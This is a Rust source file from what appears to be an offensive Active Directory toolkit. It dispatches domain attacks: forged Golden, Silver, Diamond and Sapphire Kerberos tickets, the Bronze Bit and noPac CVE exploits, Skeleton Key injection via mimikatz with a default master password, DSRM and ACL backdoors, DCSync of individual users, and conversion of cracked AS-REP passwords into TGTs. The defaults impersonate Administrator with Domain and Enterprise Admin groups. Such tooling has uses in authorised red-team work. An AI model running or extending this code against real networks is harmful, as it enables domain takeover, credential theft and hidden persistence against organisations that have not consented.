//! Top-level orchestrator for the forge pipeline.
//! Takes a ForgeConfig and dispatches to the appropriate forging module.

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::TicketGrantingData;
use serde::{Deserialize, Serialize};

use crate::{
    acl_backdoor, bronze_bit, convert, dcsync_user, diamond, dsrm, golden, nopac, sapphire, silver,
    skeleton,
};

/// What kind of ticket/persistence to forge
#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(missing_docs)]
pub enum ForgeAction {
    /// `GoldenTicket` variant
    GoldenTicket,
    /// `` variant
    SilverTicket { target_spn: String },
    /// `DiamondTicket` variant
    DiamondTicket,
    /// Enhanced Diamond — preserves original KDC checksum from legitimate TGT
    EnhancedDiamond,
    /// Sapphire Ticket — KDC-issued PAC via S4U2Self for KrbtgtFullPacSignature bypass
    SapphireTicket,
    /// Bronze Bit (CVE-2020-17049) — S4U2Proxy forwardable flag bypass
    BronzeBit { target_spn: String },
    /// `` variant
    InterRealmTgt { target_domain: String },
    /// Skeleton Key
    SkeletonKey,
    /// DSRM Backdoor
    DsrmBackdoor,
    /// DCSync specific user
    DcSyncUser { target_user: String },
    /// ACL Backdoor
    AclBackdoor { target_dn: String, trustee: String },
    /// noPac (CVE-2021-42278 / CVE-2021-42287)
    NoPac { target_dc: String },
    /// Format conversion between ticket formats
    ConvertTicket {
        /// Input file path
        input_path: String,
        /// Output format: kirbi, ccache, base64
        output_format: String,
    },
    /// Convert a cracked AS-REP roast password into a usable TGT.
    /// Takes the plaintext password from AS-REP roasting and requests
    /// a real TGT from the KDC.
    AsRepToTgt {
        /// Cracked plaintext password from AS-REP roast
        cracked_password: String,
    },
}

impl std::fmt::Display for ForgeAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::GoldenTicket => write!(f, "Golden Ticket"),
            Self::SilverTicket { target_spn } => write!(f, "Silver Ticket ({})", target_spn),
            Self::DiamondTicket => write!(f, "Diamond Ticket"),
            Self::EnhancedDiamond => write!(f, "Enhanced Diamond Ticket"),
            Self::SapphireTicket => write!(f, "Sapphire Ticket"),
            Self::BronzeBit { target_spn } => write!(f, "Bronze Bit → {}", target_spn),
            Self::InterRealmTgt { target_domain } => {
                write!(f, "Inter-Realm TGT → {}", target_domain)
            }
            Self::SkeletonKey => write!(f, "Skeleton Key"),
            Self::DsrmBackdoor => write!(f, "DSRM Backdoor"),
            Self::DcSyncUser { target_user } => write!(f, "DCSync ({})", target_user),
            Self::AclBackdoor { target_dn, trustee } => {
                write!(f, "ACL Backdoor ({} → {})", trustee, target_dn)
            }
            Self::NoPac { target_dc } => write!(f, "noPac (target DC: {target_dc})"),
            Self::ConvertTicket {
                input_path,
                output_format,
            } => {
                write!(f, "Convert Ticket ({} → {})", input_path, output_format)
            }
            Self::AsRepToTgt { .. } => write!(f, "AS-REP → TGT"),
        }
    }
}
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ForgeConfig {
    /// Domain controller IP address
    pub dc_ip: String,
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: Option<String>,
    /// Hash value
    pub nt_hash: Option<String>,
    /// action field
    pub action: ForgeAction,
    /// krbtgt hash (RC4/AES) — required for Golden/Diamond
    pub krbtgt_hash: Option<String>,
    /// krbtgt AES256 key — preferred for Diamond tickets
    pub krbtgt_aes256: Option<String>,
    /// Service account hash — required for Silver tickets
    pub service_hash: Option<String>,
    /// Domain SID (S-1-5-21-...)
    pub domain_sid: Option<String>,
    /// Target user to impersonate in forged ticket
    pub impersonate: Option<String>,
    /// User RID to embed in PAC (default: 500 = Administrator)
    pub user_rid: u32,
    /// Group RIDs for PAC (default: DA, EA, Schema Admins, etc.)
    pub group_rids: Vec<u32>,
    /// Extra SIDs to inject (for inter-realm / SID history)
    pub extra_sids: Vec<String>,
    /// Ticket lifetime in hours
    pub lifetime_hours: u32,
    /// Output path for .kirbi / .ccache file
    pub output_path: Option<String>,
    /// Path to local payload binary (e.g. mimikatz.exe for skeleton key)
    pub payload_path: Option<String>,
    /// Master password for Skeleton Key injection (defaults to "overthrone")
    pub skeleton_master_password: Option<String>,
    /// Path to PEM-encoded client certificate for PKINIT authentication
    pub pkinit_cert_path: Option<String>,
    /// Path to PEM-encoded private key for PKINIT authentication
    pub pkinit_key_path: Option<String>,
    /// Dry run — validate config and show what would be done, without executing
    pub dry_run: bool,
}

impl ForgeConfig {
    /// Return the effective impersonation user, defaulting to `Administrator`.
    pub fn effective_impersonate(&self) -> &str {
        self.impersonate.as_deref().unwrap_or("Administrator")
    }

    /// Acquire a TGT for the configured user, using PKINIT if certificate
    /// credentials are provided, or falling back to password/NTLM hash.
    ///
    /// This is the primary entry point for forge operations that need a
    /// legitimate TGT (Diamond, Sapphire, Bronze Bit).
    pub async fn request_user_tgt(&self) -> overthrone_core::error::Result<TicketGrantingData> {
        use overthrone_core::proto::kerberos;

        if let (Some(cert), Some(key)) = (&self.pkinit_cert_path, &self.pkinit_key_path) {
            crate::pkinit_auth::pkinit_authenticate(
                &self.dc_ip,
                &self.domain,
                &self.username,
                cert,
                key,
            )
            .await
        } else {
            let secret = self
                .password
                .as_deref()
                .or(self.nt_hash.as_deref())
                .ok_or_else(|| {
                    OverthroneError::TicketForge(
                        "Password, NTLM hash, or PKINIT certificate required to acquire TGT".into(),
                    )
                })?;
            kerberos::request_tgt(
                &self.dc_ip,
                &self.domain,
                &self.username,
                secret,
                self.nt_hash.is_some(),
            )
            .await
        }
    }

    /// Return the effective group RIDs, using defaults if none are configured.
    pub fn effective_groups(&self) -> Vec<u32> {
        if self.group_rids.is_empty() {
            // Default: Domain Admins(512), Domain Users(513), Schema Admins(518),
            // Enterprise Admins(519), Group Policy Creator(520)
            vec![512, 513, 518, 519, 520]
        } else {
            self.group_rids.clone()
        }
    }

    /// Return the effective ticket lifetime, defaulting to 10 hours.
    pub fn effective_lifetime(&self) -> u32 {
        if self.lifetime_hours == 0 {
            10
        } else {
            self.lifetime_hours
        }
    }
}

/// Result of a forge operation
#[derive(Debug, Clone, Serialize)]
pub struct ForgeResult {
    /// action field
    pub action: String,
    /// Domain FQDN
    pub domain: String,
    /// success field
    pub success: bool,
    /// Raw byte data
    pub ticket_data: Option<ForgedTicket>,
    /// persistence result field
    pub persistence_result: Option<PersistenceResult>,
    /// message field
    pub message: String,
}
/// Structure
#[derive(Debug, Clone, Serialize)]
pub struct ForgedTicket {
    /// Classification for this object.
    pub ticket_type: String,
    /// impersonated user field
    pub impersonated_user: String,
    /// Domain FQDN
    pub domain: String,
    /// Service Principal Name
    pub spn: String,
    /// Classification for this object.
    pub encryption_type: String,
    /// Stable unique identifier.
    pub valid_from: String,
    /// Stable unique identifier.
    pub valid_until: String,
    /// Stable unique identifier.
    pub group_rids: Vec<u32>,
    /// Security Identifier
    pub extra_sids: Vec<String>,
    /// Filesystem path.
    pub kirbi_path: Option<String>,
    /// Filesystem path.
    pub ccache_path: Option<String>,
    /// kirbi base64 field
    pub kirbi_base64: Option<String>,
    /// Size in bytes
    pub ticket_size_bytes: usize,
}
/// Structure
#[derive(Debug, Clone, Serialize)]
pub struct PersistenceResult {
    /// mechanism field
    pub mechanism: String,
    /// Target domain FQDN
    pub target: String,
    /// success field
    pub success: bool,
    /// details field
    pub details: String,
    /// cleanup command field
    pub cleanup_command: Option<String>,
}

/// Run the forge pipeline.
pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
    if config.dry_run {
        return Ok(ForgeResult {
            action: config.action.to_string(),
            domain: config.domain.clone(),
            success: true,
            ticket_data: None,
            persistence_result: None,
            message: format!(
                "[dry-run] Would forge {} ticket for {}@{}",
                config.action,
                config.effective_impersonate(),
                config.domain
            ),
        });
    }

    let result = match &config.action {
        ForgeAction::GoldenTicket => golden::forge_golden_ticket(config).await?,
        ForgeAction::SilverTicket { target_spn } => {
            silver::forge_silver_ticket(config, target_spn).await?
        }
        ForgeAction::DiamondTicket => diamond::forge_diamond_ticket(config).await?,
        ForgeAction::EnhancedDiamond => diamond::forge_diamond_ticket(config).await?,
        ForgeAction::SapphireTicket => sapphire::forge_sapphire_ticket(config).await?,
        ForgeAction::BronzeBit { target_spn } => {
            bronze_bit::run_bronze_bit(config, target_spn).await?
        }
        ForgeAction::InterRealmTgt { target_domain } => {
            golden::forge_interrealm_tgt(config, target_domain).await?
        }
        ForgeAction::SkeletonKey => skeleton::inject_skeleton_key(config).await?,
        ForgeAction::DsrmBackdoor => dsrm::enable_dsrm_backdoor(config).await?,
        ForgeAction::DcSyncUser { target_user } => {
            dcsync_user::dcsync_single_user(config, target_user).await?
        }
        ForgeAction::AclBackdoor { target_dn, trustee } => {
            acl_backdoor::install_acl_backdoor(config, target_dn, trustee).await?
        }
        ForgeAction::NoPac { target_dc } => {
            let result = nopac::run_nopac(config, target_dc).await?;
            ForgeResult {
                action: config.action.to_string(),
                domain: config.domain.clone(),
                success: result.completed,
                ticket_data: result.tgt.as_ref().map(|tgt| ForgedTicket {
                    ticket_type: "TGT".to_string(),
                    impersonated_user: target_dc.clone(),
                    domain: config.domain.clone(),
                    spn: format!("krbtgt/{}", config.domain),
                    encryption_type: "TGT".to_string(),
                    valid_from: String::new(),
                    valid_until: String::new(),
                    group_rids: config.effective_groups(),
                    extra_sids: config.extra_sids.clone(),
                    kirbi_path: None,
                    ccache_path: None,
                    kirbi_base64: None,
                    ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
                }),
                persistence_result: None,
                message: if result.completed {
                    format!(
                        "noPac attack completed. Computer: {}, Domain SID: {}",
                        result.computer_name, result.domain_sid
                    )
                } else {
                    format!("noPac attack failed: {}", result.error.unwrap_or_default())
                },
            }
        }
        ForgeAction::ConvertTicket {
            input_path,
            output_format,
        } => {
            let input_bytes = tokio::fs::read(input_path).await.map_err(|e| {
                OverthroneError::TicketForge(format!("Cannot read input file {input_path}: {e}"))
            })?;
            let from_fmt = convert::detect_format(&input_bytes)?;
            let to_fmt = convert::parse_format(output_format)?;
            let output_bytes = convert::convert_format(&input_bytes, from_fmt, to_fmt)?;
            let output_path = input_path
                .replace(".kirbi", &format!(".{}", output_format))
                .replace(".ccache", &format!(".{}", output_format))
                .replace(".b64", &format!(".{}", output_format));
            tokio::fs::write(&output_path, &output_bytes)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!("Cannot write {output_path}: {e}"))
                })?;
            ForgeResult {
                action: format!("Converted {} -> {}", input_path, output_path),
                domain: String::new(),
                success: true,
                ticket_data: None,
                persistence_result: None,
                message: format!(
                    "Ticket converted: {} -> {} ({} bytes)",
                    input_path,
                    output_path,
                    output_bytes.len()
                ),
            }
        }
        ForgeAction::AsRepToTgt { cracked_password } => {
            // Use the cracked AS-REP password to request a real TGT from the KDC.
            // This bridges the gap between hunter (AS-REP roast) and forge (ticket use).
            use overthrone_core::proto::kerberos;

            let tgt_result = kerberos::request_tgt(
                &config.dc_ip,
                &config.domain,
                &config.username,
                cracked_password,
                false, // use password, not hash
            )
            .await;

            match tgt_result {
                Ok(tgt) => ForgeResult {
                    action: "AS-REP → TGT".to_string(),
                    domain: config.domain.clone(),
                    success: true,
                    ticket_data: Some(ForgedTicket {
                        ticket_type: "TGT".to_string(),
                        impersonated_user: config.username.clone(),
                        domain: config.domain.clone(),
                        spn: format!("krbtgt/{}", config.domain),
                        encryption_type: "RC4-HMAC".to_string(),
                        valid_from: String::new(),
                        valid_until: String::new(),
                        group_rids: vec![],
                        extra_sids: vec![],
                        kirbi_path: None,
                        ccache_path: None,
                        kirbi_base64: None,
                        ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
                    }),
                    persistence_result: None,
                    message: format!(
                        "AS-REP password converted to TGT for {}@{} (ticket acquired, {} bytes encrypted)",
                        config.username,
                        config.domain,
                        tgt.ticket.enc_part.cipher.len()
                    ),
                },
                Err(e) => ForgeResult {
                    action: "AS-REP → TGT".to_string(),
                    domain: config.domain.clone(),
                    success: false,
                    ticket_data: None,
                    persistence_result: None,
                    message: format!("Failed to request TGT with AS-REP password: {}", e),
                },
            }
        }
    };

    Ok(result)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal_config(action: ForgeAction) -> ForgeConfig {
        ForgeConfig {
            dc_ip: "10.0.0.1".to_string(),
            domain: "CORP.LOCAL".to_string(),
            username: "user".to_string(),
            password: None,
            nt_hash: None,
            action,
            krbtgt_hash: None,
            krbtgt_aes256: None,
            service_hash: None,
            domain_sid: Some("S-1-5-21-1234567890-1234567890-1234567890".to_string()),
            impersonate: Some("Administrator".to_string()),
            user_rid: 500,
            group_rids: vec![],
            extra_sids: vec![],
            lifetime_hours: 10,
            output_path: None,
            payload_path: None,
            skeleton_master_password: None,
            pkinit_cert_path: None,
            pkinit_key_path: None,
            dry_run: false,
        }
    }

    #[test]
    fn test_forge_action_display_golden_ticket() {
        let s = format!("{}", ForgeAction::GoldenTicket);
        assert!(s.contains("Golden"));
    }

    #[test]
    fn test_forge_action_display_silver_ticket() {
        let s = format!(
            "{}",
            ForgeAction::SilverTicket {
                target_spn: "cifs/dc".to_string()
            }
        );
        assert!(s.contains("Silver"));
    }

    #[test]
    fn test_forge_action_display_diamond_ticket() {
        let s = format!("{}", ForgeAction::DiamondTicket);
        assert!(s.contains("Diamond"));
    }

    #[test]
    fn test_forge_action_display_sapphire_ticket() {
        let s = format!("{}", ForgeAction::SapphireTicket);
        assert!(s.contains("Sapphire"));
    }

    #[test]
    fn test_forge_action_display_bronze_bit() {
        let s = format!(
            "{}",
            ForgeAction::BronzeBit {
                target_spn: "cifs/dc".to_string()
            }
        );
        assert!(s.contains("Bronze"));
    }

    #[test]
    fn test_forge_action_display_skeleton_key() {
        let s = format!("{}", ForgeAction::SkeletonKey);
        assert!(s.contains("Skeleton"));
    }

    #[test]
    fn test_forge_action_display_dsrm_backdoor() {
        let s = format!("{}", ForgeAction::DsrmBackdoor);
        assert!(s.contains("DSRM"));
    }

    #[test]
    fn test_forge_action_display_dcsync_user() {
        let s = format!(
            "{}",
            ForgeAction::DcSyncUser {
                target_user: "admin".to_string()
            }
        );
        assert!(s.contains("DCSync"));
    }

    #[test]
    fn test_forge_action_display_acl_backdoor() {
        let s = format!(
            "{}",
            ForgeAction::AclBackdoor {
                target_dn: "DC=corp".to_string(),
                trustee: "user".to_string()
            }
        );
        assert!(s.contains("ACL"));
    }

    #[test]
    fn test_forge_action_display_nopac() {
        let s = format!(
            "{}",
            ForgeAction::NoPac {
                target_dc: "DC01".to_string()
            }
        );
        assert!(s.contains("noPac"));
    }

    #[test]
    fn test_forge_action_display_convert_ticket() {
        let s = format!(
            "{}",
            ForgeAction::ConvertTicket {
                input_path: "a.kirbi".to_string(),
                output_format: "ccache".to_string()
            }
        );
        assert!(s.contains("Convert"));
    }

    #[test]
    fn test_forge_action_serialization() {
        let action = ForgeAction::SilverTicket {
            target_spn: "cifs/dc".to_string(),
        };
        let json = serde_json::to_string(&action).unwrap();
        let parsed: ForgeAction = serde_json::from_str(&json).unwrap();
        match parsed {
            ForgeAction::SilverTicket { target_spn } => {
                assert_eq!(target_spn, "cifs/dc");
            }
            _ => panic!("Wrong variant deserialized"),
        }
    }

    #[test]
    fn test_forge_config_effective_impersonate_default() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        assert_eq!(config.effective_impersonate(), "Administrator");
    }

    #[test]
    fn test_forge_config_effective_impersonate_custom() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.impersonate = Some("alice".to_string());
        assert_eq!(config.effective_impersonate(), "alice");
    }

    #[test]
    fn test_forge_config_effective_groups_default() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        let groups = config.effective_groups();
        assert!(!groups.is_empty());
        assert!(groups.contains(&512), "should include Domain Admins (512)");
        assert!(
            groups.contains(&519),
            "should include Enterprise Admins (519)"
        );
    }

    #[test]
    fn test_forge_config_effective_groups_custom() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.group_rids = vec![100, 200, 300];
        let groups = config.effective_groups();
        assert_eq!(groups, vec![100, 200, 300]);
    }

    #[test]
    fn test_forge_config_effective_lifetime_default() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        assert_eq!(config.effective_lifetime(), 10);
    }

    #[test]
    fn test_forge_config_effective_lifetime_custom() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.lifetime_hours = 24;
        assert_eq!(config.effective_lifetime(), 24);
    }
}
